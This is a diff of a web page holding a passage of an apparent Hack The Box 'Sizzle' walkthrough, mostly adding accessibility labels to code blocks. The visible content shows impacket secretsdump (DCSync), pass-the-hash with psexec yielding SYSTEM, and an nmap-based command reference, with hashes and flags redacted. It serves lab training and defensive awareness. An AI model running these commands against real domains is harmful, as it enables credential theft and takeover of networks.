 <h3 id="step-8-2-running-secretsdump-py">Step 8.2: Running secretsdump.py</h3>
 <p>We run this from our Kali machine using <code>mrlky</code>'s hash:</p>
-<pre><code class="language-bash" data-language="bash">impacket-secretsdump -hashes REDACTED_HASH_OR_FLAG:REDACTED_HASH_OR_FLAG htb.local/mrlky@10.129.1.1
+<pre tabindex="0" aria-label="bash code or terminal block 26"><code class="language-bash" data-language="bash">impacket-secretsdump -hashes REDACTED_HASH_OR_FLAG:REDACTED_HASH_OR_FLAG htb.local/mrlky@10.129.1.1
 </code></pre>
 <p><strong>What happens:</strong></p>
 <ul>
@@ -402,7 +401,7 @@ mrlky:1603:REDACTED_HASH_OR_FLAG:REDACTED_HASH_OR_FLAG:::
 <li>The domain controller sends us the NTDS.dit secrets - all password hashes in the domain.</li>
 </ul>
 <p><strong>Output (truncated):</strong></p>
-<pre><code>Administrator:500:REDACTED_HASH_OR_FLAG:REDACTED_HASH_OR_FLAG:::
+<pre tabindex="0" aria-label="Code or terminal block 27"><code>Administrator:500:REDACTED_HASH_OR_FLAG:REDACTED_HASH_OR_FLAG:::
 Guest:501:REDACTED_HASH_OR_FLAG:REDACTED_HASH_OR_FLAG:::
 krbtgt:502:REDACTED_HASH_OR_FLAG:REDACTED_HASH_OR_FLAG:::
 amanda:1104:REDACTED_HASH_OR_FLAG:REDACTED_HASH_OR_FLAG:::
@@ -421,7 +420,7 @@ sizzler:1604:REDACTED_HASH_OR_FLAG:REDACTED_HASH_OR_FLAG:::
 <p><strong>If you have the NTLM hash, you don't need the password. You can "pass the hash" directly to authenticate.</strong></p>
 </blockquote>
 <h3 id="step-9-1-pth-with-psexec-py">Step 9.1: PTH with psexec.py</h3>
-<pre><code class="language-bash" data-language="bash">impacket-psexec -hashes REDACTED_HASH_OR_FLAG:REDACTED_HASH_OR_FLAG htb.local/Administrator@10.129.1.1
+<pre tabindex="0" aria-label="bash code or terminal block 28"><code class="language-bash" data-language="bash">impacket-psexec -hashes REDACTED_HASH_OR_FLAG:REDACTED_HASH_OR_FLAG htb.local/Administrator@10.129.1.1
 </code></pre>
 <p><strong>What psexec does:</strong></p>
 <ol>
@@ -432,18 +431,18 @@ sizzler:1604:REDACTED_HASH_OR_FLAG:REDACTED_HASH_OR_FLAG:::
 <li>We get a command shell</li>
 </ol>
 <p><strong>Success:</strong></p>
-<pre><code>Microsoft Windows [Version 10.0.14393]
+<pre tabindex="0" aria-label="Code or terminal block 29"><code>Microsoft Windows [Version 10.0.14393]
 (c) 2016 Microsoft Corporation. All rights reserved.
 
 C:\Windows\system32&gt; whoami
 nt authority\system
 </code></pre>
 <h3 id="step-9-2-grabbing-the-flags">Step 9.2: Grabbing the Flags</h3>
-<pre><code class="language-cmd" data-language="cmd">type C:\Users\mrlky\Desktop\user.txt
+<pre tabindex="0" aria-label="cmd code or terminal block 30"><code class="language-cmd" data-language="cmd">type C:\Users\mrlky\Desktop\user.txt
 type C:\Users\Administrator\Desktop\root.txt
 </code></pre>
 <p><strong>Results:</strong></p>
-<pre><code>e6062d[redacted]8c052c0b1e
+<pre tabindex="0" aria-label="Code or terminal block 31"><code>e6062d[redacted]8c052c0b1e
 d9d0a5[redacted]38d5d7c444e
 </code></pre>
 
@@ -490,7 +489,7 @@ d9d0a5[redacted]38d5d7c444e
 <p>Treat NTLM hashes with the same sensitivity as plaintext passwords. With Pass-the-Hash, they ARE passwords. A domain with LM hashes enabled, weak passwords, or excessive replication rights is a domain waiting to fall.</p>
 <hr>
 <h2 id="full-command-reference">Full Command Reference</h2>
-<pre><code class="language-bash" data-language="bash"># === PHASE 1: RECON ===
+<pre tabindex="0" aria-label="bash code or terminal block 32"><code class="language-bash" data-language="bash"># === PHASE 1: RECON ===
 nmap -p- -sS --open --min-rate 5000 -Pn -n -vvv -oG allPorts 10.129.1.1
 nmap -p21,53,80,135,139,389,443,445,464,593,636,3268,3269,5985,5986 -sCV -Pn -n -vvv -oN targeted 10.129.1.1
 
@@ -527,9 +526,9 @@ impacket-secretsdump -hashes REDACTED_HASH_OR_FLAG:REDACTED_HASH_OR_FLAG htb.loc
 # === PHASE 9: PASS-THE-HASH ===
 impacket-psexec -hashes REDACTED_HASH_OR_FLAG:REDACTED_HASH_OR_FLAG htb.local/Administrator@10.129.1.1
 </code></pre>
-<hr>b:["$","div",null,{"className":"article-prose","dangerouslySetInnerHTML":{"__html":"$11"}}]
-c:["$","nav",null,{"className":"article-pagination shell","aria-label":"Writing navigation","data-motion":"group","children":[["$","div",null,{"children":["$","$L2",null,{"href":"/writing/hackthebox-arkham-walkthrough","data-motion-surface":"control","children":[["$","span",null,{"data-depth-layer":"meta","children":"More recent in Hack The Box"}],["$","strong",null,{"data-depth-layer":"title","children":"Hack The Box: Arkham Walkthrough"}],["$","time",null,{"dateTime":"2026-06-13T15:24:31.451Z","data-depth-layer":"meta","children":"13 Jun 2026"}]]}]}],["$","$L2",null,{"className":"article-pagination-index","href":"/writing","children":["All ",127," articles"]}],["$","div",null,{"children":["$","$L2",null,{"href":"/writing/hackthebox-search-walkthrough","data-motion-surface":"control","children":[["$","span",null,{"data-depth-layer":"meta","children":"Earlier in Hack The Box"}],["$","strong",null,{"data-depth-layer":"title","children":"Hack The Box: Search Walkthrough"}],["$","time",null,{"dateTime":"2026-06-11T16:07:39.000Z","data-depth-layer":"meta","children":"11 Jun 2026"}]]}]}]]}]
-d:["$","footer",null,{"className":"site-footer","data-motion":"section","children":[["$","div",null,{"className":"shell footer-main","children":[["$","div",null,{"children":[["$","$L2",null,{"className":"brand footer-brand","href":"/","children":[["$","span",null,{"className":"recon-prism-mark","aria-hidden":"true","children":[["$","span",null,{"className":"recon-prism-edge recon-prism-edge-north"}],["$","span",null,{"className":"recon-prism-edge recon-prism-edge-west"}],["$","span",null,{"className":"recon-prism-edge recon-prism-edge-east"}],["$","span",null,{"className":"recon-prism-edge recon-prism-edge-south"}],["$","span",null,{"className":"recon-prism-spine"}],["$","span",null,{"className":"recon-prism-fork recon-prism-fork-upper"}],["$","span",null,{"className":"recon-prism-fork recon-prism-fork-lower"}],["$","span",null,{"className":"recon-prism-core"}],["$","span",null,{"className":"recon-prism-node recon-prism-node-one"}],["$","span",null,{"className":"recon-prism-node recon-prism-node-two"}],["$","span",null,{"className":"recon-prism-node recon-prism-node-three"}]]}],["$","span",null,{"children":"CyberKareem"}]]}],["$","p",null,{"children":"Abdullah Kareem · Penetration Tester at Ejabi InfoSec · Security Researcher"}]]}],["$","div",null,{"className":"footer-link-groups","children":[["$","nav",null,{"className":"footer-site-nav","aria-label":"Site pages","children":[["$","$L2","About",{"href":"/about","children":"About"}],["$","$L2","Projects",{"href":"/projects","children":"Projects"}],["$","$L2","Research",{"href":"/research","children":"Research"}],["$","$L2","Writing",{"href":"/writing","children":"Writing"}],["$","$L2","Services",{"href":"/services","children":"Services"}],["$","$L2","Contact",{"href":"/contact","children":"Contact"}],["$","$L2","Policies",{"href":"/policies","children":"Policies"}]]}],["$","nav",null,{"className":"social-links","aria-label":"Contact and public profiles","children":[["$","$L2","Business email",{"href":"/contact","children":["Business email"," ",["$","span",null,{"aria-hidden":"true","children":"→"}],["$","span",null,{"className":"sr-only","children":" opens the browser-based contact options"}]]}],["$","a","LinkedIn",{"href":"https://www.linkedin.com/in/cyberkareem/","target":"_blank","rel":"noreferrer","children":["LinkedIn"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","a","Discord",{"href":"https://discord.com/invite/f6dryR2uGt","target":"_blank","rel":"noreferrer","children":["Discord"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","a","GitHub",{"href":"https://github.com/CyberKareem","target":"_blank","rel":"noreferrer","children":["GitHub"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","a","X",{"href":"https://x.com/cyberkareem","target":"_blank","rel":"noreferrer","children":["X"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}]]}],["$","$L12",null,{}]]}]]}],["$","div",null,{"className":"shell footer-bottom","children":[["$","span",null,{"children":"© 2026 Abdullah Kareem"}],["$","span",null,{"children":"Security research · engineering background · clear reporting"}],["$","$L2",null,{"href":"/about#career","children":"View professional background →"}]]}]]}]
-13:T548,{"@context":"https://schema.org","@graph":[{"@type":"BlogPosting","@id":"https://cyberkareem.com/writing/hackthebox-sizzle-walkthrough/#article","headline":"Hack The Box: Sizzle Walkthrough","description":"A writable SMB share enables SCF-based NTLM capture and certificate-authenticated WinRM access, after which a recovered privileged hash leads to DCSync and Administrator access.","url":"https://cyberkareem.com/writing/hackthebox-sizzle-walkthrough/","datePublished":"2026-06-11T16:09:45.000Z","dateModified":"2026-06-11T16:09:45.000Z","wordCount":2925,"articleSection":"Hack The Box","isBasedOn":"https://github.com/CyberKareem/OSEP-Prep/blob/540ce46f57834e2f55146507411aac9f3229ed42/HTB-Sizzle.md","author":{"@id":"https://cyberkareem.com/#person"},"publisher":{"@id":"https://cyberkareem.com/#person"},"image":"https://cyberkareem.com/social/v2/writing/hackthebox-sizzle-walkthrough.png","mainEntityOfPage":"https://cyberkareem.com/writing/hackthebox-sizzle-walkthrough/"},{"@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Home","item":"https://cyberkareem.com/"},{"@type":"ListItem","position":2,"name":"Writing","item":"https://cyberkareem.com/writing/"},{"@type":"ListItem","position":3,"name":"Hack The Box: Sizzle Walkthrough","item":"https://cyberkareem.com/writing/hackthebox-sizzle-walkthrough/"}]}]}e:["$","script",null,{"type":"application/ld+json","dangerouslySetInnerHTML":{"__html":"$13"}}]
-f:["$","$L14",null,{"children":["$","$15",null,{"name":"Next.MetadataOutlet","children":"$@16"}]}]
-16:null
+<hr>a:["$","div",null,{"className":"article-layout shell","children":[["$","aside",null,{"className":"article-context","aria-label":"Article context","data-motion":"fade","children":[["$","$Lf",null,{"headings":[{"id":"introduction","label":"Introduction"},{"id":"phase-1-initial-reconnaissance","label":"Phase 1: Initial Reconnaissance"},{"id":"phase-2-smb-enumeration-finding-the-entry-point","label":"Phase 2: SMB Enumeration: Finding the Entry Point"},{"id":"phase-3-the-scf-attack-capturing-hashes","label":"Phase 3: The SCF Attack: Capturing Hashes"},{"id":"phase-4-hash-cracking-from-hash-to-password","label":"Phase 4: Hash Cracking: From Hash to Password"},{"id":"phase-5-active-directory-certificate-services-adcs","label":"Phase 5: Active Directory Certificate Services (ADCS)"},{"id":"phase-6-certificate-based-winrm-authentication","label":"Phase 6: Certificate-Based WinRM Authentication"},{"id":"phase-7-post-exploitation-and-the-shortcut","label":"Phase 7: Post-Exploitation & The Shortcut"},{"id":"phase-8-dcsync-stealing-the-domain","label":"Phase 8: DCSync: Stealing the Domain"},{"id":"phase-9-pass-the-hash-becoming-system","label":"Phase 9: Pass-the-Hash: Becoming SYSTEM"},{"id":"review-notes","label":"Review notes"},{"id":"full-command-reference","label":"Full Command Reference"}]}],["$","div",null,{"className":"article-provenance","children":[["$","span",null,{"children":"Source"}],[["$","p",null,{"children":"Technical source and supporting notes."}],["$","a",null,{"href":"https://github.com/CyberKareem/OSEP-Prep/blob/540ce46f57834e2f55146507411aac9f3229ed42/HTB-Sizzle.md","target":"_blank","rel":"nofollow noopener noreferrer","children":["Immutable source revision",["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","small",null,{"children":["CyberKareem/OSEP-Prep",", commit 540ce46f5783",""]}]]]}],["$","div",null,{"className":"article-review-note article-review-lab-safety","children":[["$","span",null,{"children":"Official machine record"}],["$","p",null,{"children":["Sizzle, Windows, Insane",". Retirement verified ","12 Jul 2026","."," ","This walkthrough covers an authorized lab. Use these techniques only on systems you own or are explicitly authorized to test."]}],["$","a",null,{"href":"https://www.hackthebox.com/machines/sizzle","target":"_blank","rel":"nofollow noopener noreferrer","children":["View public machine page ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}]]}],[["$","div","source-context-0",{"className":"article-review-note article-review-source-context","children":[["$","span",null,{"children":"Source context"}],["$","p",null,{"children":"Based on Abdullah Kareem's public preparation notes and edited for clarity. Commands and technical claims remain tied to the documented lab and tool versions; this page does not add new solution steps or imply Hack The Box endorsement."}],null]}],["$","div","editorial-correction-1",{"className":"article-review-note article-review-editorial-correction","children":[["$","span",null,{"children":"Reusable artifacts removed"}],["$","p",null,{"children":"38 redacted retired-lab artifact occurrences were replaced with descriptive placeholders while preserving the attack method, including credentials, keys, tickets, hashes, flags, private links, or encoded material."}],null]}],["$","div","technical-clarification-2",{"className":"article-review-note article-review-technical-clarification","children":[["$","span",null,{"children":"Technical clarification"}],["$","p",null,{"children":"Technical clarification: one normal password change invalidates the preceding NT hash for ordinary Pass-the-Hash use. DCSync remediation depends on the actual compromise scope; it does not automatically require forest recovery in every incident."}],null]}]]]}],["$","div",null,{"className":"article-prose","dangerouslySetInnerHTML":{"__html":"$10"}}]]}]
+b:["$","nav",null,{"className":"article-pagination shell","aria-label":"Writing navigation","data-motion":"group","children":[["$","div",null,{"children":["$","$L2",null,{"href":"/writing/hackthebox-arkham-walkthrough","data-motion-surface":"control","children":[["$","span",null,{"data-depth-layer":"meta","children":"More recent in Hack The Box"}],["$","strong",null,{"data-depth-layer":"title","children":"Hack The Box: Arkham Walkthrough"}],["$","time",null,{"dateTime":"2026-06-13T15:24:31.451Z","data-depth-layer":"meta","children":"13 Jun 2026"}]]}]}],["$","$L2",null,{"className":"article-pagination-index","href":"/writing","children":["All ",127," articles"]}],["$","div",null,{"children":["$","$L2",null,{"href":"/writing/hackthebox-search-walkthrough","data-motion-surface":"control","children":[["$","span",null,{"data-depth-layer":"meta","children":"Earlier in Hack The Box"}],["$","strong",null,{"data-depth-layer":"title","children":"Hack The Box: Search Walkthrough"}],["$","time",null,{"dateTime":"2026-06-11T16:07:39.000Z","data-depth-layer":"meta","children":"11 Jun 2026"}]]}]}]]}]
+c:["$","footer",null,{"className":"site-footer","data-motion":"section","children":[["$","div",null,{"className":"shell footer-main","children":[["$","div",null,{"children":[["$","$L2",null,{"className":"brand footer-brand","href":"/","children":[["$","span",null,{"className":"recon-prism-mark","aria-hidden":"true","children":[["$","span",null,{"className":"recon-prism-edge recon-prism-edge-north"}],["$","span",null,{"className":"recon-prism-edge recon-prism-edge-west"}],["$","span",null,{"className":"recon-prism-edge recon-prism-edge-east"}],["$","span",null,{"className":"recon-prism-edge recon-prism-edge-south"}],["$","span",null,{"className":"recon-prism-spine"}],["$","span",null,{"className":"recon-prism-fork recon-prism-fork-upper"}],["$","span",null,{"className":"recon-prism-fork recon-prism-fork-lower"}],["$","span",null,{"className":"recon-prism-core"}],["$","span",null,{"className":"recon-prism-node recon-prism-node-one"}],["$","span",null,{"className":"recon-prism-node recon-prism-node-two"}],["$","span",null,{"className":"recon-prism-node recon-prism-node-three"}]]}],["$","span",null,{"children":"CyberKareem"}]]}],["$","p",null,{"children":"Abdullah Kareem · Penetration Tester at Ejabi InfoSec · Security Researcher"}]]}],["$","div",null,{"className":"footer-link-groups","children":[["$","nav",null,{"className":"footer-site-nav","aria-label":"Site pages","children":[["$","$L2","About",{"href":"/about","children":"About"}],["$","$L2","Projects",{"href":"/projects","children":"Projects"}],["$","$L2","Research",{"href":"/research","children":"Research"}],["$","$L2","Writing",{"href":"/writing","children":"Writing"}],["$","$L2","Services",{"href":"/services","children":"Services"}],["$","$L2","Contact",{"href":"/contact","children":"Contact"}],["$","$L2","Policies",{"href":"/policies","children":"Policies"}]]}],["$","nav",null,{"className":"social-links","aria-label":"Contact and public profiles","children":[["$","$L2","Business email",{"href":"/contact","children":["Business email"," ",["$","span",null,{"aria-hidden":"true","children":"→"}],["$","span",null,{"className":"sr-only","children":" opens the browser-based contact options"}]]}],["$","a","LinkedIn",{"href":"https://www.linkedin.com/in/cyberkareem/","target":"_blank","rel":"noreferrer","children":["LinkedIn"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","a","Discord",{"href":"https://discord.com/invite/f6dryR2uGt","target":"_blank","rel":"noreferrer","children":["Discord"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","a","GitHub",{"href":"https://github.com/CyberKareem","target":"_blank","rel":"noreferrer","children":["GitHub"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","a","X",{"href":"https://x.com/cyberkareem","target":"_blank","rel":"noreferrer","children":["X"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}]]}],["$","$L11",null,{}]]}]]}],["$","div",null,{"className":"shell footer-bottom","children":[["$","span",null,{"children":"© 2026 Abdullah Kareem"}],["$","span",null,{"children":"Security research · engineering background · clear reporting"}],["$","$L2",null,{"href":"/about#career","children":"View professional background →"}]]}]]}]
+12:T548,{"@context":"https://schema.org","@graph":[{"@type":"BlogPosting","@id":"https://cyberkareem.com/writing/hackthebox-sizzle-walkthrough/#article","headline":"Hack The Box: Sizzle Walkthrough","description":"A writable SMB share enables SCF-based NTLM capture and certificate-authenticated WinRM access, after which a recovered privileged hash leads to DCSync and Administrator access.","url":"https://cyberkareem.com/writing/hackthebox-sizzle-walkthrough/","datePublished":"2026-06-11T16:09:45.000Z","dateModified":"2026-06-11T16:09:45.000Z","wordCount":2925,"articleSection":"Hack The Box","isBasedOn":"https://github.com/CyberKareem/OSEP-Prep/blob/540ce46f57834e2f55146507411aac9f3229ed42/HTB-Sizzle.md","author":{"@id":"https://cyberkareem.com/#person"},"publisher":{"@id":"https://cyberkareem.com/#person"},"image":"https://cyberkareem.com/social/v2/writing/hackthebox-sizzle-walkthrough.png","mainEntityOfPage":"https://cyberkareem.com/writing/hackthebox-sizzle-walkthrough/"},{"@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Home","item":"https://cyberkareem.com/"},{"@type":"ListItem","position":2,"name":"Writing","item":"https://cyberkareem.com/writing/"},{"@type":"ListItem","position":3,"name":"Hack The Box: Sizzle Walkthrough","item":"https://cyberkareem.com/writing/hackthebox-sizzle-walkthrough/"}]}]}d:["$","script",null,{"type":"application/ld+json","dangerouslySetInnerHTML":{"__html":"$12"}}]
+e:["$","$L13",null,{"children":["$","$14",null,{"name":"Next.MetadataOutlet","children":"$@15"}]}]
+15:null
